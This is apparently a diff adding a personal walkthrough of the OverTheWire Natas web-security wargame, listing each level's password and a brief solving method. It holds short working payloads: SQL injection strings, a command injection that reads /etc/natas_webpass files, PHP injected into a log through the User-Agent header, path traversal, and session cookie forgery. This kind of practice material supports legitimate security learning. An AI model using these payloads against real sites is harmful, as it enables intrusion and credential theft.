@@ -1,0 +1,129 @@
+=======================================================
+				
+						NATAS
+
+=======================================================
+
+  Connection : http://natas0.natas.labs.overthewire.org (pass : natas0)
+
+ (GIVEN)
+
+natas0 : natas0
+ (  View Source code.
+ 	<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --> )
+
+natas1 : gtVrDuiDfck831PqWsLEZy5gyDz1clto
+ (  Press -> Ctrl + U
+ 	<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --> )
+
+natas2 : ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+ (  Nevigate to -> /files/user.txt
+ 	natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 )
+
+natas3 : sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+ (  Nevigate to -> /robots.txt -> /s3cr3t/users.txt
+ 	natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ )
+
+natas4 : Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+ (  Change Refer to -> natas5.natas.labs.overthewire.org
+ 	Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq )
+
+natas5 : iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+ (  Change cookie value loogedin - 1 
+ 	Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 )
+
+natas6 : aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+ (  $secret = FOEIUWGHFEEUHOFUOIU (nevigate to -> /includes/secret.inc )
+ 	Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 )
+
+natas7 : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+ (  Change page GET variable -> /etc/natas_webpass/natas8
+ 	DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe )
+
+natas8 : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+ (  natas8.php -> secret: oubWYf2kBq
+ 	Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl )
+
+natas9 : W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+ (  Query -> a /etc/natas_webpass/natas9
+ 	/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu )
+
+natas10 : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+ (  Query -> u /etc/natas_webpass/natas9
+ 	/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK )
+
+natas11 : U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+ (  change cookie value -> use natas11.php
+	The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 )
+
+natas12 : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+ (  Burp change extension of hidden input $_FILES['filename'] to .php <- to execute our crafted php payload
+   	upload natas12.php in upload section )
+
+natas13 : jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+ (  add magic number of jpg image (FF D8 FF E0) at the starting of the file
+ 	change Burp as in above case
+    upload natas13.php in upload section and nevigate to the file and give cmd as a get parameter -> cat /etc/natas_webpass/natas13 )
+
+natas14 : Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+ (  Simple SQL injection -> input -> ("OR"1"="1 )
+ 	Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J)
+
+natas15 : AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+ (  Sqlblind injection -> script natas15.py )
+
+natas16 : WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+ (  command injection -> query $(grep ^'' /etc/natas_webpass/natas17)hacker
+    script natas16.py ) 
+
+natas17 : 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+ (  Time based sql injection -> script natas17.py )
+
+natas18 : xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+ (  Correct value PHPSESSID -> 119 )
+
+natas19 : 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+ (  Correct value PHPSESSID -> (281-admin) -> (3238312d61646d696e))
+
+natas20 : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+ (  name = "nooob%0Aadmin%201" -> "nooob\nadmin 1"
+ 	write a new field admin in session array with value 1)
+
+natas21 : IFekPyrQXftziDEsUr3x21sYuahypdgJ
+ (  make a fake session cookie using admin=1 feild in experiment challange and pass it to the main page
+ 	crafted sessiid = '0109cmo1is0vtem04h3km2tuu4' )
+
+natas22 : chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+ (  simple add the GET parameter and intercept the redirection using burp )
+
+natas23 : D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+ (  passwod = '11iloveyoumom' fulfil all the conditions)
+
+natas24 : OsRmXFguozKpTZZ5X14zNO43379LZveg
+ (	make passwd variable as an array )
+
+natas25 : GHF6X7YwACaYYssHVY05cFq83hRktl4c
+ (	1. inject php code in log file by editing USER AGENT and setting PHPSID 
+ 		USER AGENT = <?php include '/etc/natas_webpass/natas26' ?>
+ 		PHPSID = noo
+ 	2. traverse to that file -> '....//logs/natas25_noo.log')
+
+natas26 : oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+ (  1. make a crafted cookie using natas26.php file and change it with $_COOKIE["drawing"]. 
+ 	2. move to /img/nooob.php file 
+ 	BUG -> deserialization of user handeled cookie directly without any check)
+
+natas27 : 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+ ( 	create a user with username -> natas26++++++++++++++++++++++++++++++(64times)+++1 ans password = anything 
+ 	this will make a user and then u login with username -> natas26 ans password -> anything
+ 	get the credentials of natas28 )
+
+natas28 : JWwR438wkgTsNKBbcJoowyysdM82YjeF
+ ( 	query -> 
+ 	('flag')='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLqvYBsXFL5vhNFqfU+bZMEKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY='
+ 	('natas29')='G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIQ9i1qWcR+wgATYlCscOxBZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44='
+
+
+
+
+ 	)
